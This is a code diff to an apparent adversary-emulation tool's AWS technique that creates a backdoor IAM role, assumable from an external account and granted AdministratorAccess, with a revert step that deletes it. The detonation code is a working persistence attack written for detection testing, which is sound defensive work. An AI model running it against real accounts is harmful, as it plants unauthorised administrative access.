@@ -13,28 +13,29 @@ import (
 //go:embed malicious_policy.json
 var maliciousIamPolicy string
 
-var roleName string = "malicious-iam-role"
+var roleName string = "stratus-red-team-malicious-iam-role"
 var adminPolicyArn string = "arn:aws:iam::aws:policy/AdministratorAccess"
 
 func init() {
 	const codeBlock = "```"
 	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
 		ID:           "aws.persistence.iam-create-backdoor-role",
-		FriendlyName: "Create a new backdoor IAM Role",
+		FriendlyName: "Create a backdoored IAM Role",
 		Description: `
-Establishes persistence by creating a backdoored new role with a policy allowing it to be assumed from an external AWS account and administrative permissions.
+Establishes persistence by creating a new backdoor role with a trust policy allowing it to be assumed from 
+an external, fictitious attack AWS account.
 
 Warm-up: None.
 
 Detonation: 
 
-- Create a new IAM role with an assume role policy backdoored, making it accessible from an external, fictitious AWS account:
+- Create a new IAM role with the following trust policy:
 
-` + codeBlock + `
+` + codeBlock + `json
 ` + maliciousIamPolicy + `
 ` + codeBlock + `
 
-and attach the 'AdministratorAccess' managed IAM policy to it. 
+- Attach the 'AdministratorAccess' managed IAM policy to it. 
 
 References:
 
@@ -59,11 +60,11 @@ which generates a finding when a role can be assumed from a new AWS account or p
 }
 ` + codeBlock + `
 `,
-		Platform:                   stratus.AWS,
-		IsIdempotent:               false, // cannot create twice a role with the same name
-		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence},
-		Detonate:                   detonate,
-		Revert:                     revert,
+		Platform:           stratus.AWS,
+		IsIdempotent:       false, // cannot create twice a role with the same name
+		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Persistence},
+		Detonate:           detonate,
+		Revert:             revert,
 	})
 }
 
@@ -76,20 +77,19 @@ func detonate(_ map[string]string, providers stratus.CloudProviders) error {
 		AssumeRolePolicyDocument: &maliciousIamPolicy,
 	}
 
-	_, err := iamClient.CreateRole(context.TODO(), input)
+	_, err := iamClient.CreateRole(context.Background(), input)
 	if err != nil {
 		return errors.New("Unable to create IAM role: " + err.Error())
 	}
 
 	log.Println("IAM role created: " + roleName)
-	
-	
+
 	attachPolicyInput := &iam.AttachRolePolicyInput{
 		RoleName:  &roleName,
 		PolicyArn: &adminPolicyArn,
 	}
 
-	_, err = iamClient.AttachRolePolicy(context.TODO(), attachPolicyInput)
+	_, err = iamClient.AttachRolePolicy(context.Background(), attachPolicyInput)
 	if err != nil {
 		log.Fatalf("Unable to attach AdministratorAccess policy to IAM role: %v", err)
 	}
@@ -104,7 +104,7 @@ func revert(_ map[string]string, providers stratus.CloudProviders) error {
 		RoleName:  &roleName,
 		PolicyArn: &adminPolicyArn,
 	}
-	_, err := iamClient.DetachRolePolicy(context.TODO(), detachPolicyInput)
+	_, err := iamClient.DetachRolePolicy(context.Background(), detachPolicyInput)
 	if err != nil {
 		return errors.New("Unable to detach policy from IAM role: " + err.Error())
 	}
@@ -113,7 +113,7 @@ func revert(_ map[string]string, providers stratus.CloudProviders) error {
 	input := &iam.DeleteRoleInput{
 		RoleName: &roleName,
 	}
-	_, err = iamClient.DeleteRole(context.TODO(), input)
+	_, err = iamClient.DeleteRole(context.Background(), input)
 	if err != nil {
 		return errors.New("Unable to delete IAM role: " + err.Error())
 	}
